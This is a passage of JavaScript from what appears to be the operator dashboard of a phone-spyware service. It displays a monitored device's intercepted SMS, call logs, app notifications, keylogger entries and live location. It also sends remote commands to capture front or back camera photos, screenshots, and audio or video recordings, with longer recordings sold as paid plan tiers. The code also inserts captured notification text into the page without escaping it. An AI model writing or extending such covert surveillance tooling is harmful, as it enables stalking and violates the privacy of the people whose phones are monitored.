                            <div class="call-duration">Duration: ${c.duration || 'N/A'}s</div>
                            <div class="call-time">${formattedTime}</div>
                        </div>
                    </div>
                `;
            });
            break;

        case 'notifications':
            list.forEach(item => {
                const n = item.data;
                if (!n) return;
                
                const appName = (n.appName || 'default').toLowerCase();
                let appIcon = '';

                if (appName.includes('whatsapp')) {
                    // Start WhatsApp Icon (Green) - Used for both WhatsApp and WhatsApp Business
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.894 11.892-1.99 0-3.903-.52-5.586-1.459l-6.354 1.687zM5.222 19.865a.47.47 0 0 0 .123.16.89.89 0 0 0 .283.172l.006.002.002.001a.985.985 0 0 0 .437.106l.02.001h.001l.001.001c.217.005.433.003.647-.005l.024-.001.003-.001.003-.001c.231-.019.458-.049.68-.09l.022-.006.001-.001c.229-.052.454-.117.67-.193l.001-.001c.214-.075.424-.162.627-.261l.002-.001c.203-.1.4-.211.586-.33l.001-.001c.184-.118.362-.245.532-.38l.001-.001c.17-.134.33-.278.48-.43l.002-.002c.119-.122.23-.249.333-.38a1.21 1.21 0 0 0 .248-.356l.001-.002c.075-.123.14-.252.196-.386l.002-.005a5.532 5.532 0 0 0 .265-1.026l.001-.003c-.021-.06-.021-.121-.021-.183v-.009c.004-.233.024-.465.059-.694l.003-.001.002-.001c.046-.24.108-.476.184-.705l.001-.003c.078-.229.17-.453.275-.669l.001-.002c.105-.216.224-.424.354-.622l.002-.003c.13-.198.27-.387.42-.567l.001-.001c.149-.18.307-.35.474-.508l.002-.002a.49.49 0 0 0 .092-.085l-.001-.002c.002 0 .003 0 .005-.001a.39.39 0 0 0 .118-.11c.023-.024.045-.05.066-.076l.001-.002c.021-.025.04-.052.059-.08l.001-.001c.019-.028.037-.057.053-.086l.001-.002c.016-.029.03-.06.044-.09l.001-.002c.014-.03.026-.062.038-.094l.001-.002c.012-.032.023-.065.033-.098l.001-.002c.01-.033.018-.067.026-.1l.001-.003c.008-.033.015-.067.021-.101l.001-.003c.006-.034.01-.069.014-.104l.001-.002c.004-.035.007-.07.01-.105l.001-.003h.001c.002-.023.004-.046.005-.069l.001-.003c.001-.023.002-.047.002-.07v-.009a.054.054 0 0 0-.001-.01c0-.003 0-.005 0-.008l-.001-.002c0-.003 0-.006-.001-.009v-.003c0-.003 0-.006-.001-.009l-.001-.002a.11.11 0 0 0-.004-.012c0-.002 0-.004 0-.007l-.001-.002c-.001-.003-.002-.006-.003-.009l-.001-.002a.44.44 0 0 0-.012-.027l-.001-.001a.34.34 0 0 0-.012-.02l-.002-.001a.22.22 0 0 0-.02-.024l-.002-.002c-.007-.008-.014-.016-.022-.024l-.002-.002a.48.48 0 0 0-.044-.04l-.002-.001a.29.29 0 0 0-.04-.032l-.001-.001a.19.19 0 0 0-.022-.016h-.001a.06.06 0 0 0-.009-.004c-.002 0-.005 0-.007-.001h-.002c-.002 0-.005 0-.007-.001h-.002c-.005 0-.01 0-.015-.001h-.001c-.005 0-.01 0-.015-.001l-2.906.012c-.088.001-.177.004-.265.009l-.002.001c-.088.005-.175.013-.262.025l-.001.001c-.087.012-.173.028-.258.047l-.002.001c-.085.019-.169.041-.252.066l-.002.001c-.083.025-.165.053-.245.084l-.002.001c-.08.031-.158.065-.235.102l-.002.001c-.077.037-.152.077-.226.12l-.002.001c-.074.043-.146.089-.217.137l-.002.001c-.071.048-.14.1-.208.154l-.002.001c-.068.054-.133.11-.197.168l-.002.001c-.064.058-.125.118-.185.18l-.002.001c-.06.062-.117.126-.172.19l-.002.002c-.055.064-.107.13-.158.197l-.002.002c-.051.067-.099.135-.145.204l-.002.002c-.046.069-.089.139-.13.21l-.002.002c-.041.071-.079.143-.114.215l-.002.002c-.035.072-.068.145-.098.218l-.002.002c-.03.073-.057.147-.082.221l-.002.003c-.025.074-.047.148-.067.223l-.002.003c-.02.075-.038.15-.053.225l-.002.003c-.015.075-.028.15-.04.225l-.002.003c-.012.075-.022.15-.03.225l-.001.003c-.008.075-.013.15-.017.225l-.001.003c-.004.075-.006.15-.006.225l.001.003c0 .075.002.15.005.225l.001.002c.003.075.008.15.014.225l.001.002c.006.075.014.15.023.224l.001.002c.009.074.02.148.032.221l.001.002c.012.073.026.146.042.218l.002.002c.016.072.033.143.052.213l.002.002c.019.07.04.139.062.207l.002.002c.022.068.046.135.07.201l.002.002c.024.066.05.13.077.194l.002.002c.027.064.055.126.084.187l.002.002c.029.061.059.12.09.178l.002.002c.031.058.062.115.094.17l.002.002c.032.055.065.109.098.162l.002.002c.033.053.067.105.101.155l.002.002c.034.05.069.098.104.146l.002.002c.035.048.07.094.106.139l.002.001c.036.045.072.089.109.132l.002.002c.037.043.074.084.112.125l.002.001c.038.041.076.081.115.119l.002.002c.039.038.078.075.117.111l.002.002c.039.036.078.07.118.103l.002.001c.04.033.08.065.12.096l.002.001c.04.031.08.06.12.088l.002.001c.04.028.08.055.12.081l.002.001c.04.026.08.05.12.073l.002.001c.04.023.08.044.12.065l.002.001c.04.021.08.04.12.058l.002.001c.04.018.08.035.12.05l.002.001c.04.015.08.029.12.042l.002.001c.04.013.08.025.12.036l.002.001c.04.011.08.02.12.029l.002.001c.04.009.08.017.12.024l.002.001c.04.007.08.013.12.018l.002.001c.04.005.08.009.12.012l.002.001c.04.003.08.005.12.006l.002.001c.04.001.08.001.12.001h.001c.04 0 .08 0 .12-.001l.002-.001c.04-.001.08-.003.12-.006l.002-.001c.04-.003.08-.007.12-.012l.002-.001c.04-.005.08-.011.12-.018l.002-.001c.04-.007.08-.015.12-.024l.002-.001c.04-.009.08-.019.12-.029l.002-.001c.04-.011.08-.023.12-.036l.002-.001c.04-.013.08-.027.12-.042l.002-.001c.04-.015.08-.032.12-.05l.002-.001c.04-.018.08-.037.12-.058l.002-.001c.04-.021.08-.044.12-.065l.002-.001c.04-.023.08-.047.12-.073l.002-.001c.04-.026.08-.053.12-.081l.002-.001c.04-.028.08-.058.12-.088l.002-.001c.04-.031.08-.063.12-.096l.002-.001c.04-.033.078-.067.118-.103l.002-.001c.039-.036.078-.073.117-.111l.002-.002c.039-.038.076-.077.115-.119l.002-.001c.038-.041.075-.083.112-.125l.002-.002c.037-.043.073-.087.109-.132l.002-.002c.036-.045.071-.091.106-.139l.002-.001c.035-.048.069-.098.104-.146l.002-.002c.034-.05.067-.101.101-.155l.002-.002c.033-.053.065-.107.098-.162l.002-.002c.032-.055.062-.112.094-.17l.002-.002c.031-.058.061-.117.09-.178l.002-.002c.029-.061.056-.123.084-.187l.002-.002c.027-.064.052-.13.077-.194l.002-.002c.024-.066.048-.133.07-.201l.002-.002c.022-.068.043-.138.062-.207l.002-.002c.019-.07.036-.141.052-.213l.002-.002c.016-.072.03-.145.042-.218l.001-.002c.012-.073.023-.147.032-.221l.001-.002c.009-.074.017-.148.023-.224l.001-.002c.006-.075.011-.15.014-.225l.001-.002c.003-.075.004-.15.005-.225h.001c0-.075-.002-.15-.006-.225l-.001-.003c-.004-.075-.009-.15-.017-.225l-.001-.003c-.008-.075-.018-.15-.03-.225l-.001-.003c-.012-.075-.025-.15-.04-.225l-.002-.003c-.015-.075-.033-.15-.053-.225l-.002-.003c-.02-.075-.042-.149-.067-.223l-.002-.003c-.025-.074-.052-.148-.082-.221l-.002-.003c-.03-.073-.063-.146-.098-.218l-.002-.002c-.035-.072-.073-.144-.114-.215l-.002-.002c-.041-.071-.084-.141-.13-.21l-.002-.002c-.046-.069-.094-.137-.145-.204l-.002-.002c-.051-.067-.103-.133-.158-.197l-.002-.002c-.055-.064-.112-.128-.172-.19l-.002-.002c-.06-.062-.121-.122-.185-.18l-.002-.001c-.064-.058-.13-.114-.197-.168l-.002-.002c-.068-.054-.137-.106-.208-.154l-.002-.002c-.071-.048-.143-.094-.217-.137l-.002-.002c-.074-.043-.152-.083-.226-.12l-.002-.002c-.077-.037-.155-.071-.235-.102l-.002-.002c-.08-.031-.162-.059-.245-.084l-.002-.001c-.083-.025-.169-.047-.252-.066l-.002-.001c-.085-.019-.171-.035-.258-.047l-.002-.001c-.087-.012-.174-.02-.262-.025l-.002-.001c-.088-.005-.177-.008-.265-.009l-2.906-.011z"/></svg>';
                } else if (appName.includes('instagram')) {
                    // Instagram Icon (Colorful or White depending on theme, using simple stroke here but usually distinctive)
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>';
                } else if (appName.includes('facebook') || appName.includes('messenger')) {
                    // Facebook/Messenger Icon (Blue)
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg>';
                } else if (appName.includes('telegram')) {
                    // Telegram Icon (Sky Blue Paper Plane)
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2AABEE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>';
                    n.appName = 'Telegram'; // Normalize Display Name
                } else if (appName.includes('gmail') || appName.includes('mail')) {
                    // Gmail Icon (Red Envelope)
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#EA4335" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>';
                } else if (appName.includes('snapchat')) {
                    // Snapchat Icon (Yellow Ghost)
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FFFC00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.5 10.5C2.5 10.5 4 10.5 4 11C4 11.5 3 12.5 3 13C3 13.5 4.5 14 4.5 14C4.5 14 4.5 16 4 17C3.5 18 2 18 2 18C2 18 4.5 22 12 22C19.5 22 22 18 22 18C22 18 20.5 18 20 17C19.5 16 19.5 14 19.5 14C19.5 14 21 13.5 21 13C21 12.5 20 11.5 20 11C20 10.5 21.5 10.5 21.5 10.5C21.5 10.5 22 6 12 6C2 6 2.5 10.5 2.5 10.5Z"/></svg>';
                } else {
                    // Default Icon (Bell)
                    appIcon = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>';
                }
                const formattedTime = createTimestamp(item, n);
                
                html += `
                    <div class="notification-card-enhanced ${appName.split(' ')[0]}">
                        <div class="notification-header-enhanced">
                            <div class="app-icon">${appIcon}</div>
                            <div class="app-name">${n.appName || 'Notification'}</div>
                        </div>
                        <div class="notification-body-enhanced">
                            <div class="notification-title-enhanced">${n.title || 'No Title'}</div>
                            <div class="notification-text-enhanced">${n.text || ''}</div>
                            ${n.urlImage ? `<img src="${n.urlImage}" class="notification-image-enhanced" alt="Notification Image">` : ''}
                        </div>
                        <div class="notification-footer-enhanced">
                            ${formattedTime}
                        </div>
                    </div>
                `;
            });
            break;

        case 'userlog':
            list.forEach(item => {
                const i = item.data;
                const txt = formatPrettyText(i);
                const alertClass = getAlertClass(txt);
                const formattedTime = createTimestamp(item, i);
                html += `<div class="keylog-card ${alertClass}" style="word-break: break-word;">
                            <div class="keylog-timestamp-header"><b style="color:white;">${formattedTime}</b></div>
                            <div class="keylog-text">${txt}</div>
                         </div>`;
            });
            break;

        default:
             list.forEach(item => {
                 const s = item.data;
                 if (!s) return;
                 const content = typeof s === 'string' ? s : (s.text || s.body || '');
                 const alertClass = getAlertClass(content);
                 const formattedTime = createTimestamp(item, s);
                 html += `<div class="sms-card professional-card ${alertClass}">
                             <div class="sms-header outgoing">
                                 <span class="message-type">${cat}</span>
                                 <span class="sender-info">${s.title || 'Item'}</span>
                             </div>
                             <div class="sms-body-content"><p>${formatPrettyText(s)}</p></div>
                             <div class="sms-footer"><span>${formattedTime}</span></div>
                          </div>`;
             });
             break;
    }
    return html;
}

function renderItems(cat, list, path) {
    currentDownloadableData = list;
    let html = `<div class="data-header">
                    <button onclick="downloadCurrentData('${cat}')" style="background-color: #27ae60; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">Download</button>
                    <button class="clear-btn" data-path="${path}">Clear All</button>
                </div>`;
    
    // Add specific container wrappers
    if (cat === 'sms') html += '<div class="chat-interface">';
    else if (cat === 'calllogs') html += '<div class="calllog-list">';
    else if (cat === 'notifications') html += '<div class="notification-list-enhanced">';
    else if (cat === 'userlog') html += '<div class="keylog-list">';
    else html += '<div class="sms-list">';

    html += generateItemsHTML(cat, list);

    html += '</div>'; // Close container
    modalDataDisplayArea.innerHTML = html;
}

/**
 * Dynamically loads Leaflet.js CSS and JS if they are not already present.
 * @returns {Promise<void>} A promise that resolves when the scripts are loaded.
 */
function loadLeaflet() {
    return new Promise((resolve, reject) => {
        // Check if Leaflet is already loaded
        if (window.L) {
            resolve();
            return;
        }

        const cssId = 'leaflet-css';
        const jsId = 'leaflet-js';

        // Load CSS
        if (!document.getElementById(cssId)) {
            const link = document.createElement('link');
            link.id = cssId;
            link.rel = 'stylesheet';
            link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
            link.integrity = 'sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=';
            link.crossOrigin = '';
            document.head.appendChild(link);
        }

        // Load JS
        if (!document.getElementById(jsId)) {
            const script = document.createElement('script');
            script.id = jsId;
            script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
            script.integrity = 'sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=';
            script.crossOrigin = '';
            document.head.appendChild(script);
            script.onload = () => resolve();
            script.onerror = () => reject('Failed to load Leaflet.js');
        } else {
             // If script tag is there but L is not, wait for it to load
            const existingScript = document.getElementById(jsId);
            existingScript.addEventListener('load', () => resolve());
            existingScript.addEventListener('error', () => reject('Failed to load Leaflet.js'));
        }
    });
}

/**
 * Renders the location data on an interactive Leaflet map.
 * @param {object} locationData - The decompressed location object.
 * @param {string} path - The Firebase path for the clear button.
 * @param {string|null} key - The Firebase key for the location entry, which might be a timestamp.
 */
async function showLocation(rawData, path) {
    // 1. Construct parameters path for the command button
    const { userId, childKey } = selectedUserInfo;
    const pPath = `user/${userId}/${childKey}/location/params`;

    // 2. Add the new "Update Location" button to the header
    let html = `
        <div class="data-header">
            <button onclick="cmd('${pPath}', {getLocation: true})">Update Location</button>
            <button class="clear-btn" data-path="${path}">Clear All</button>
        </div>
    `;

    let locationData = null;
    let latestKey = null;

    // Logic to find the most recent location entry
    if (typeof rawData === 'object' && rawData !== null) {
        const keys = Object.keys(rawData);
        if (keys.length > 0) {
            // Sort keys to find the latest; assumes keys are timestamps or sortable
            keys.sort();
            latestKey = keys[keys.length - 1];
            const latestItem = rawData[latestKey];

            // Decompress data whether it's a direct string or in a .data property
            if (typeof latestItem === 'string') {
                locationData = decompressData(latestItem);
            } else if (typeof latestItem === 'object' && latestItem && latestItem.data) {
                locationData = decompressData(latestItem.data);
            } else {
                locationData = latestItem;
            }
        }
    } else if (typeof rawData === 'string') {
        // Handle case where rawData is just a single compressed string
        locationData = decompressData(rawData);
    }

    // If no valid location data, show message and exit
    if (!locationData || !locationData.latitude || !locationData.longitude) {
        html += '<div class="location-card" style="text-align:center; padding: 20px;">No valid location data found.</div>';
        modalDataDisplayArea.innerHTML = html;
        return;
    }

    currentDownloadableData = [locationData];

    // 3. Extract data and ensure robust timestamp logic
    const { latitude, longitude, address } = locationData;
    const finalTime = getRealTimestamp(latestKey, locationData); // Use helper for robust timestamp
    const formattedTime = formatTimestamp(finalTime);

    // 4. Build the HTML with coordinates text, timestamp, and map container
    html += `
        <div class="location-card">
            <div class="location-info-header">
                <p><b>Lat:</b> ${latitude}, <b>Long:</b> ${longitude}</p>
                ${address ? `<p><b>Address:</b> ${address}</p>` : ''}
                <small><b>Last Updated:</b> ${formattedTime}</small>
            </div>
            <div id="map"></div>
            <div class="location-footer">
                <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="gmaps-btn">Open in Google Maps</a>
            </div>
        </div>
    `;
    modalDataDisplayArea.innerHTML = html;

    // 5. Load Leaflet and render the map
    try {
        await loadLeaflet();

        // Delay map initialization to ensure DOM is ready
        setTimeout(() => {
            const mapElement = document.getElementById('map');
            if (!mapElement) return;

            const map = L.map('map').setView([latitude, longitude], 16);

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(map);

            L.marker([latitude, longitude]).addTo(map)
                .bindPopup(`Location at ${formattedTime}`)
                .openPopup();
            
            // Fix for map not rendering correctly in a modal
            map.invalidateSize();

        }, 100);

    } catch (error) {
        console.error("Leaflet map loading failed:", error);
        const mapElement = document.getElementById('map');
        if(mapElement) mapElement.innerHTML = `<p style="color:red; text-align:center;">Error: Could not load map.</p>`;
    }
}


// ==========================================
// PART 5: MEDIA, CHAT & GLOBAL LISTENERS
// ==========================================

// [UPDATED] Helper to Update Limit AND Send Command
window.cmdWithLimit = async function(uid, ck, pPath, durationMs, commandData) {
    try {
        // Enforce Plan Limits Logic Here TOO to prevent "Free User Hack"
        // Wait, we can't easily check plan here without another read. 
        // But the UI won't show the option.
        // As an extra safety measure, strictly floor the duration if needed, 
        // but for now, rely on smart usage.
        
        const durationSec = Math.floor(durationMs / 1000);
        const limitUpdate = {};
        limitUpdate[`user/${uid}/${ck}/limits/maxRecordingDuration`] = durationSec;
        limitUpdate[`user/${uid}/${ck}/limits/maxVideoDuration`] = durationMs;
        limitUpdate[`user/${uid}/${ck}/limits/maxAudioDuration`] = durationMs;
        
        await update(ref(db), limitUpdate);
        await update(ref(db, pPath), commandData);
        
        // Use toast if available, fallback to alert
        if (typeof showToast === 'function') showToast(`Limit ${durationSec}s & Sent!`);
        else alert(`Limit set to ${durationSec}s & Command Sent!`);
        
    } catch(e) {
        console.error(e);
        alert('Error: ' + e.message);
    }
};

window.sendSmartCmd = function(uid, ck, pPath, type, facing) {
    const selId = `${type}-duration-${uid}`;
    const selectEl = document.getElementById(selId);
    if (!selectEl) return;
    
    const durationMs = parseInt(selectEl.value);
    
    const cmdData = {};
    if (type === 'video') {
        cmdData.recordVideo = true;
        cmdData.facing = facing; 
        cmdData.duration = durationMs;
    } else { 
        cmdData.recordAudio = true;
        cmdData.duration = durationMs;
    }
    
    window.cmdWithLimit(uid, ck, pPath, durationMs, cmdData);
};

// [FIXED] Dynamic Button Loader - COMPACT & STRICT
async function loadDynamicButtons(uid, ck, type, pPath) {
    const container = document.getElementById(`cmd-buttons-${type}`);
    if (!container) return;
    
    try {
        const limRef = ref(db, `user/${uid}/${ck}/limits`);
        const snap = await get(limRef);
        const val = snap.val() || {};
        
        // STRICT PLAN CHECK
        // If maxRecordingDuration is explicitly > 30, we trust it.
        // If maxVideoLimit is high, we trust it.
        // OTHERWISE -> FREE PLAN (30s Only)
        
        const recordedDur = val.maxRecordingDuration || 30; // Default 30
        const vidLimit = val.maxVideoLimit || 0; // Default 0
        
        // Gold: Dur >= 60 OR Videos >= 20. (Free is typically 4 videos)
        const isGold = (recordedDur >= 60) || (vidLimit >= 20);
        // Platinum: Dur >= 300 OR Videos >= 100.
        const isPlatinum = (recordedDur >= 300) || (vidLimit >= 100);

        let optionsHtml = `<option value="30000">30s (Default)</option>`;
        
        // Strict Appends
        if (isGold) {
            optionsHtml += `<option value="60000">1 Min (Gold)</option>`;
            optionsHtml += `<option value="120000">2 Mins (Gold)</option>`;
        }
        
        if (isPlatinum) {
            // Add remaining platinum options
            // Note: Platinum users ALSO get gold options (added above)
            optionsHtml += `<option value="180000">3 Mins (Plat)</option>`;
            optionsHtml += `<option value="300000">5 Mins (Plat)</option>`;
        }

        // COMPACT/CLEAN UI
        // Uses flex row to align dropdown and buttons nicely without huge boxes
        let html = `
        <div style="display:flex; align-items:center; gap:8px; margin-top:5px; background:rgba(255,255,255,0.05); padding:6px; border-radius:6px;">
            <select id="${type}-duration-${uid}" style="flex:1; padding:6px; background:#161b22; color:#fff; border:1px solid #30363d; border-radius:4px; font-size:13px; max-width:110px;">
                ${optionsHtml}
            </select>
            
            <div style="display:flex; gap:5px; flex:2;">
        `;
        
        if (type === 'video') {
            html += `<button class="modern-btn" style="flex:1; font-size:12px; padding:6px 10px;" onclick="sendSmartCmd('${uid}','${ck}','${pPath}','video',1)">Front</button>`;
            html += `<button class="modern-btn" style="flex:1; background:#238636; font-size:12px; padding:6px 10px;" onclick="sendSmartCmd('${uid}','${ck}','${pPath}','video',0)">Back</button>`;
        } else {
             html += `<button class="modern-btn" style="flex:1; font-size:12px; padding:6px 10px;" onclick="sendSmartCmd('${uid}','${ck}','${pPath}','audio',0)">Record Audio</button>`;
        }
        
        html += `</div></div>`;
        
        container.innerHTML = html;
        
    } catch(e) {
        console.error("Error loading buttons", e);
        container.innerHTML = '<span style="color:red; font-size:12px">Error</span>';
    }
}


// 1. Updated Global Opener (Handles Image Mode)
window.openCleanViewer = function(url, type) {
    let modal = document.getElementById('clean-media-modal');
    if (!modal) return; // Should be injected in renderMedia

    const container = document.getElementById('clean-container-box');

    // Reset content and classes
    container.innerHTML = '';
    container.className = 'clean-viewer-container'; // Reset to default

    if (type === 'photo' || type === 'screenshot') {
        container.classList.add('image-mode');
        
        // This viewer uses an iframe and crops it to hide the 3rd-party site's header and footer.
        // The goal is to show the image and the site's own pink download button, but hide text below it.
        // NOTE: The inline style values for cropping are tuned based on user feedback.
        const photoViewerHTML = `
            <div style="width: 100%; height: 100%; overflow: hidden; position: relative;">
                 <iframe src="${url}" style="width: 100%; height: calc(100% + 220px); position: absolute; top: -80px; left: 0; border: none;"></iframe>
            </div>
        `;
        container.innerHTML = photoViewerHTML;

    } else { // Audio and video are working as expected
        container.innerHTML = `<iframe class="clean-viewer-iframe" src="${url}" allow="autoplay; encrypted-media"></iframe>`;
    }

    modal.classList.add('visible');
};

window.closeCleanViewer = function() {
    const modal = document.getElementById('clean-media-modal');
    const container = document.getElementById('clean-container-box');
    if (modal) modal.classList.remove('visible');
    // Destroy the content immediately to stop media and clear history
    if (container) container.innerHTML = '';
};

function renderMedia(uid, ck, type) {
    const lowerType = type.toLowerCase();
    let path = `user/${uid}/${ck}/${lowerType}/data`;
    let pPath = `user/${uid}/${ck}/${lowerType}/params`;

    // Inject Modal HTML (Without the iframe initially) if not exists
    if (!document.getElementById('clean-media-modal')) {
        const modalHTML = `
            <div id="clean-media-modal">
                <span class="clean-close-btn" onclick="closeCleanViewer()">×</span>
                <div id="clean-container-box" class="clean-viewer-container">
                </div>
            </div>`;
        document.body.insertAdjacentHTML('beforeend', modalHTML);
    }

    // Command Buttons
    let btnContainer = '';
    
    if (lowerType === 'photo') {
        btnContainer = `<button onclick="cmd('${pPath}',{capturePhoto:true,facingPhoto:1})">Front</button> <button onclick="cmd('${pPath}',{capturePhoto:true,facingPhoto:0})">Back</button>`;
    } else if (lowerType === 'screenshot') {
         btnContainer = `<button onclick="cmd('${pPath}',true)">Take Screenshot</button>`;
    } else {
        // Dynamic loading for Audio/Video
        btnContainer = `<span id="cmd-buttons-${lowerType}">Loading...</span>`;
        // Load buttons async
        setTimeout(() => loadDynamicButtons(uid, ck, lowerType, pPath), 50);
    }

    modalDataDisplayArea.innerHTML = `<div class="data-header">${btnContainer}<button class="clear-btn" data-path="${path}">Clear</button></div><div id="media-grid" class="media-grid media-grid-${lowerType}"></div>`;

    const r = ref(db, path);
    activeDataListener = {
        ref: r,
        callback: (snap) => {
            if (!snap.exists()) {
                const g = document.getElementById('media-grid');
                if (g) g.innerHTML = '<p style="text-align:center;color:var(--text-secondary);">No media found in this category.</p>';
                return;
            }
            
            let g = document.getElementById('media-grid');
            if (!g) return;

            g.innerHTML = Object.entries(snap.val()).reverse().map(([key, i]) => {
                let d = decompressData(i);
                if (!d) return '';

                const finalTime = getRealTimestamp(key, d);
                let timestamp = formatTimestamp(finalTime);

                let mediaElement = '';
                // Corrected: Check for d.url (used by Screenshot model)
                const url = d.urlPhoto || d.urlScreenshot || d.audioUrl || d.videoUrl || d.url;

                if (lowerType === 'photo' || lowerType === 'screenshot') {
                    mediaElement = `
                        <div class="media-timestamp-header"><b style="color:white;">${timestamp}</b></div>
                        <div class="media-card-image" onclick="openCleanViewer('${url}','${lowerType}')">
                            <img src="${url}" loading="lazy">
                            <div class="media-card-overlay">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 12.5a2.5 2.5 0 1 0 5 0 2.5 2.5 0 1 0-5 0z"/><path d="M21 4H3v16h18V4z"/><path d="M3.5 13.5 9 9l4 4L17.5 9"/></svg>
                            </div>
                        </div>
                    `;
                } else if (lowerType === 'video') {
                    mediaElement = `
                        <div class="media-timestamp-header"><b style="color:white;">${timestamp}</b></div>
                        <div class="video-player-wrapper" onclick="openCleanViewer('${url}','video')">
                             <div style="width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #000;">
                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="#fb7185" stroke="#fb7185" stroke-width="2"><path d="M8 5v14l11-7z"/></svg>
                             </div>
                        </div>
                    `;
                } else if (lowerType === 'audio') {
                    mediaElement = `
                        <div class="media-timestamp-header"><b style="color:white;">${timestamp}</b></div>
                        <div class="audio-player-wrapper" onclick="openCleanViewer('${url}','audio')">
                             <div style="width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #2dd4bf20;">
                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#2dd4bf" stroke-width="2"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
                             </div>
                        </div>
                    `;
                }

                return `<div class="media-card media-card-${lowerType}">${mediaElement}</div>`;
            }).join('');
        }
    };
    onValue(r, activeDataListener.callback);
}

// Helper function to open image in a modal
function openImageModal(imageUrl) {
    // Check if a modal for images already exists
    let modal = document.getElementById('image-viewer-modal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'image-viewer-modal';
        modal.classList.add('modal-overlay');
        modal.style.zIndex = '3000'; // Ensure it's on top
        modal.innerHTML = `
            <div class="modal-content-image-viewer">
                <span class="close-image-modal">&times;</span>
                <img class="modal-image-content" src="">
            </div>
        `;
        document.body.appendChild(modal);
        
        // Event listeners for closing
        modal.querySelector('.close-image-modal').onclick = () => {
            modal.style.display = 'none';
        };
        modal.onclick = (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        };
    }
    
    // Set the image and display the modal
    modal.querySelector('.modal-image-content').src = imageUrl;
    modal.style.display = 'flex';
}

function renderChatInterface(userId, childKey) {
    // Mark messages as read when chat is opened
    markChatAsRead(userId, childKey);
    
    const chatHtml = `
        <div class="live-chat-area">
            <div class="chat-messages" id="admin-chat-messages"></div>
            <div class="chat-input-area">
                <input type="text" id="admin-chat-input" placeholder="Type your reply...">
                <button id="admin-chat-send-btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
                </button>
            </div>
        </div>
    `;
    modalDataDisplayArea.innerHTML = chatHtml;
    document.getElementById('modal-title').textContent = `Live Chat with ${selectedUserInfo.childKey}`;

    const messagesArea = document.getElementById('admin-chat-messages');
    const input = document.getElementById('admin-chat-input');
    const sendBtn = document.getElementById('admin-chat-send-btn');

    const chatPath = `user/${userId}/${childKey}/chat`;
    const chatRef = ref(db, chatPath);

    activeDataListener = {
        ref: chatRef,
        callback: onValue(chatRef, (snapshot) => {
            messagesArea.innerHTML = '';
            if (snapshot.exists()) {
                const messages = snapshot.val();
                let latestTimestamp = 0;

                Object.values(messages).forEach(msg => {
                    const bubble = document.createElement('div');
                    bubble.classList.add('chat-bubble', msg.sender); // 'user' or 'admin'
                    
                    if (msg.timestamp > latestTimestamp) {
                        latestTimestamp = msg.timestamp;
                    }

                    const text = document.createElement('div');
                    text.textContent = msg.text;

                    const time = document.createElement('div');
                    time.classList.add('chat-time');
                    time.textContent = formatTimestamp(msg.timestamp);

                    bubble.appendChild(text);
                    bubble.appendChild(time);
